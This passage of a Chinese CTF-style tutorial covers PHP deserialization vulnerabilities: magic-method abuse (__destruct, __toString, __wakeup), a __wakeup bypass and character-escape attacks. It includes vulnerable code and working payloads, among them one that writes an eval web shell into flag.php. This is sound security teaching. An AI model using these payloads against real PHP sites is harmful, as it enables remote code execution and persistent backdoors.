进行输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $ser = &#x27;O:6:&quot;object&quot;:3:&#123;s:1:&quot;a&quot;;i:1;s:4:&quot;team&quot;;s:6:&quot;hahaha&quot;;&#125;&#x27;;</span><br><span class=\"line\">    $ser = unserialize($ser);</span><br><span class=\"line\">    echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class=\"line\">    var_dump($ser);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">object(__PHP_Incomplete_Class)#1 (3) &#123;</span><br><span class=\"line\">  [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;</span><br><span class=\"line\">  string(6) &quot;object&quot;</span><br><span class=\"line\">  [&quot;a&quot;]=&gt;</span><br><span class=\"line\">  int(1)</span><br><span class=\"line\">  [&quot;team&quot;]=&gt;</span><br><span class=\"line\">  string(6) &quot;hahaha&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a class=\"markdownIt-Anchor\" href=\"#利用\">#</a> 利用：</h3>\n<p>在反序列化过程中，其功能就类似于创建了一个新的对象（复原一个对象可能更恰当），并赋予其相应的属性值。如果让攻击者操纵任意反序列数据， 那么攻击者就可以实现任意类对象的创建，如果一些类存在一些自动触发的方法（魔术方法），那么就有可能以此为跳板进而攻击系统应用。</p>\n<p>挖掘反序列化漏洞的条件是：</p>\n<blockquote>\n<p>1. 代码中有可利用的类，并且类中有__wakeup ()，__sleep ()，__destruct () 这类特殊条件下可以自己调用的魔术方法。</p>\n<p>2. unserialize () 函数的参数可控。</p>\n</blockquote>\n<h4 id=\"0x00-__destruct利用\"><a class=\"markdownIt-Anchor\" href=\"#0x00-__destruct利用\">#</a> 0x00 __destruct () 利用</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class A&#123;</span><br><span class=\"line\">    var $test = &quot;demo&quot;;</span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        @eval($this-&gt;test);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$test = $_POST[&#x27;test&#x27;];</span><br><span class=\"line\">$len = strlen($test)+1;</span><br><span class=\"line\">$p = &quot;O:1:\\&quot;A\\&quot;:1:&#123;s:4:\\&quot;test\\&quot;;s:&quot;.$len.&quot;:\\&quot;&quot;.$test.&quot;;\\&quot;;&#125;&quot;; // 构造序列化对象</span><br><span class=\"line\">$test_unser = unserialize($p); // 反序列化同时触发_destruct函数</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//利用同名变量覆盖和还原对象 可以理解为$test = $_POST[&#x27;test&#x27;],复原时还需要有对应的变量值的length</span><br><span class=\"line\">//由于destruct会在对象销毁时自动调用，我们只需要传入对应的恶意外码即可，题目已经帮我们构造好了序列化后的代码</span><br><span class=\"line\"></span><br><span class=\"line\">payload:</span><br><span class=\"line\">post:</span><br><span class=\"line\">test=phpinfo();</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>如上代码，最终的目的是通过调用__destruct () 这个析构函数，将恶意的 payload 注入，导致代码执行。根据上面的魔术方法的介绍，当程序跑到 unserialize () 反序列化的时候，会触发__destruct () 方法，同时也可以触发__wakeup () 方法。但是如果想注入恶意 payload，还需要对<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mi>e</mi><mi>s</mi><mi>t</mi><mtext>的值进行覆盖，题目中已经给出了序列化链，很明显是对类</mtext><mi>A</mi><mtext>的</mtext></mrow><annotation encoding=\"application/x-tex\">test的值进行覆盖，题目中已经给出了序列化链，很明显是对类A的</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">值</span><span class=\"mord cjk_fallback\">进</span><span class=\"mord cjk_fallback\">行</span><span class=\"mord cjk_fallback\">覆</span><span class=\"mord cjk_fallback\">盖</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">题</span><span class=\"mord cjk_fallback\">目</span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">已</span><span class=\"mord cjk_fallback\">经</span><span class=\"mord cjk_fallback\">给</span><span class=\"mord cjk_fallback\">出</span><span class=\"mord cjk_fallback\">了</span><span class=\"mord cjk_fallback\">序</span><span class=\"mord cjk_fallback\">列</span><span class=\"mord cjk_fallback\">化</span><span class=\"mord cjk_fallback\">链</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">很</span><span class=\"mord cjk_fallback\">明</span><span class=\"mord cjk_fallback\">显</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">对</span><span class=\"mord cjk_fallback\">类</span><span class=\"mord mathnormal\">A</span><span class=\"mord cjk_fallback\">的</span></span></span></span> test 变量进行覆盖。</p>\n</blockquote>\n<h4 id=\"0x01-__tostring利用\"><a class=\"markdownIt-Anchor\" href=\"#0x01-__tostring利用\">#</a> 0x01 __tostring () 利用</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//index.php</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">$txt = $_GET[&quot;txt&quot;]; </span><br><span class=\"line\">$file = $_GET[&quot;file&quot;]; </span><br><span class=\"line\">$password = $_GET[&quot;password&quot;]; </span><br><span class=\"line\">if(isset($txt)&amp;&amp;(file_get_contents($txt,&#x27;r&#x27;)===&quot;welcome to the bugkuctf&quot;))</span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    echo &quot;hello friend!&lt;br&gt;&quot;; </span><br><span class=\"line\">    if(preg_match(&quot;/flag/&quot;,$file))</span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">       echo &quot;不能现在就给你flag哦&quot;; </span><br><span class=\"line\">       exit(); </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">       include($file); </span><br><span class=\"line\">       $password = unserialize($password); </span><br><span class=\"line\">       echo $password; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">&#123; </span><br><span class=\"line\">       echo &quot;you are not the number of bugku ! &quot;; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//hint.php</span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">class Flag&#123;//flag.php  </span><br><span class=\"line\">    public $file;  </span><br><span class=\"line\">    public function __tostring()&#123;  </span><br><span class=\"line\">        if(isset($this-&gt;file))&#123;  </span><br><span class=\"line\">            echo file_get_contents($this-&gt;file); </span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">            return (&quot;good&quot;);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">payload:</span><br><span class=\"line\">?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>hint.php 文件中使用了魔术方法__tostring () 方法，当一个对象被当作一个字符串被调用时即可触发，方法的主要作用是读取并打印传进来的 $file，估计是通过反序列化漏洞来读取 flag.php 的内容。追踪以下调用链，在 index.php 文件中发现使用 echo 将反序列化的对象当作字符串打印，此处就会触发__tostring () 方法，并且 unserialize () 内的变量可控，满足反序列化漏洞条件。</p>\n</blockquote>\n<h4 id=\"0x02-__wakeup利用\"><a class=\"markdownIt-Anchor\" href=\"#0x02-__wakeup利用\">#</a> 0x02 __wakeup () 利用</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class test&#123;</span><br><span class=\"line\">    var $test = &#x27;123&#x27;;</span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        $fp = fopen(&quot;flag.php&quot;,&quot;w&quot;);</span><br><span class=\"line\">        fwrite($fp,$this-&gt;test);</span><br><span class=\"line\">        fclose($fp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">print_r($a);</span><br><span class=\"line\">echo &quot;&lt;/br&gt;&quot;;</span><br><span class=\"line\">$a_unser = unserialize($a);</span><br><span class=\"line\">require &quot;flag.php&quot;;</span><br><span class=\"line\">?&gt;     </span><br><span class=\"line\"></span><br><span class=\"line\">pyload:</span><br><span class=\"line\">?id=O:4:&quot;test&quot;:1:&#123;s:4:&quot;test&quot;;s:27:&quot;&lt;?php eval($_GET[&#x27;sb&#x27;]); ?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">class test&#123;</span><br><span class=\"line\">    var $test = &quot;&lt;?php eval($_GET[&#x27;sb&#x27;]); ?&gt;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$test = new test();</span><br><span class=\"line\">echo serialize($test);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>通过调用魔术方法__wakeup 将 $test 的值写入 flag.php 文件中，当调用 unserialize () 反序列化操作时会触发__wakeup 魔术方法，接下来就需要构造传进去的 payload</p>\n<p>在执行 unserialize () 方法时会触发__wakeup () 方法执行，将传入的字符串反序列化后，会替换掉 test 类里面 $test 变量的值，将 php 探针写入 flag.php 文件中，并通过下面的 require 引用，导致命令执行。</p>\n</blockquote>\n<h4 id=\"0x03-__wakeup绕过\"><a class=\"markdownIt-Anchor\" href=\"#0x03-__wakeup绕过\">#</a> 0x03 __wakeup () 绕过</h4>\n<p>极客大挑战 2019 PHP</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//index.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"string\">&#x27;class.php&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$select</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;select&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$res</span>=<span class=\"title function_ invoke__\">unserialize</span>(@<span class=\"variable\">$select</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//class.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;nonono&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span> = <span class=\"string\">&#x27;yesyes&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>,<span class=\"variable\">$password</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"string\">&#x27;guest&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;password != <span class=\"number\">100</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You name is: &quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;username;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You password is: &quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;password;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;username === <span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();            </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>,<span class=\"variable\">$password</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Name</span>(<span class=\"string\">&#x27;admin&#x27;</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Name&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Nameusername&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;admin&quot;</span>;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Namepassword&quot;</span>;i:<span class=\"number\">100</span>;&#125;</span><br><span class=\"line\">O%<span class=\"number\">3</span>A4%<span class=\"number\">3</span>A%<span class=\"number\">22</span>Name%<span class=\"number\">22</span>%<span class=\"number\">3</span>A2%<span class=\"number\">3</span>A%<span class=\"number\">7</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>username%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A5%<span class=\"number\">3</span>A%<span class=\"number\">22</span>admin%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>password%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bi%<span class=\"number\">3</span>A100%<span class=\"number\">3</span>B%<span class=\"number\">7</span>D</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\">//其实你这么写也行~</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span>=<span class=\"string\">&#x27;admin&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>=<span class=\"number\">100</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Name</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Name&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Nameusername&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;admin&quot;</span>;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Namepassword&quot;</span>;i:<span class=\"number\">100</span>;&#125;</span><br><span class=\"line\">O%<span class=\"number\">3</span>A4%<span class=\"number\">3</span>A%<span class=\"number\">22</span>Name%<span class=\"number\">22</span>%<span class=\"number\">3</span>A2%<span class=\"number\">3</span>A%<span class=\"number\">7</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>username%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A5%<span class=\"number\">3</span>A%<span class=\"number\">22</span>admin%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>password%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bi%<span class=\"number\">3</span>A100%<span class=\"number\">3</span>B%<span class=\"number\">7</span>D</span><br></pre></td></tr></table></figure>\n<p><strong>当成员属性数目大于实际数目时可绕过 wakeup 方法</strong>，其次 private 的 %00 是老生常谈了</p>\n<h4 id=\"0x04对象逃逸\"><a class=\"markdownIt-Anchor\" href=\"#0x04对象逃逸\">#</a> 0x04 对象逃逸</h4>\n<p>当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生 PHP 反序列化字符逃逸的漏洞。</p>\n<p>对于 PHP 反序列字符逃逸，我们分为以下两种情况进行讨论。</p>\n<ul>\n<li>过滤后字符变多</li>\n<li>过滤后字符变少</li>\n</ul>\n<h5 id=\"过滤后字符变多\"><a class=\"markdownIt-Anchor\" href=\"#过滤后字符变多\">#</a> 过滤后字符变多</h5>\n<p>设我们先定义一个<strong> user</strong> 类，然后里面一共有 3 个成员变量：<strong>username</strong>、<strong>password</strong>、<strong>isVIP</strong>。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">user</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$isVIP</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$u</span>,<span class=\"variable\">$p</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$u</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$p</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;isVIP = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">user</span>(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;123456&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$a_seri</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a_seri</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span></span><br><span class=\"line\"><span class=\"comment\">//可以看到，由于isVIP在构造函数中被赋值为0，因此序列化后的&quot;isVIP&quot;;i:0</span></span><br></pre></td></tr></table></figure>\n<p>这个时候我们增加一个函数，用于对<strong> admin</strong> 字符进行替换，将<strong> admin</strong> 替换为<strong> hacker</strong>，替换函数如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function filter($s)&#123;</span><br><span class=\"line\">    return str_replace(&quot;admin&quot;,&quot;hacker&quot;,$s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这一段程序的输出为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span 